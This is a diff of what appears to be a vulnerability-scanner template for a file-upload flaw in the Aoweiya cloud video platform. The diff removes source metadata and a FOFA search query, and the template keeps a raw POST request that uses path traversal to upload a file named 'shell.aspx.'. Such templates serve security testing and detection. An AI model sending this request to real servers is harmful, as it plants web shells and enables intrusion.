@@ -3,12 +3,8 @@ info:
   name: 奥威亚云视频平台UploadFile.aspx存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ug8r8ntlchsqnxh1'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ug8r8ntlchsqnxh1
-    fofa: body="/Upload/DomainInfo/MaxAVALogo.png"
 http:
 - raw:
   - 'POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1
@@ -31,7 +27,6 @@ http:
     Content-Disposition: form-data; name="file"; filename="shell.aspx."
 
     Content-Type: image/jpeg
-
 
 
     ------sajhdjqwjejqwbejhqwbjebqwhje-
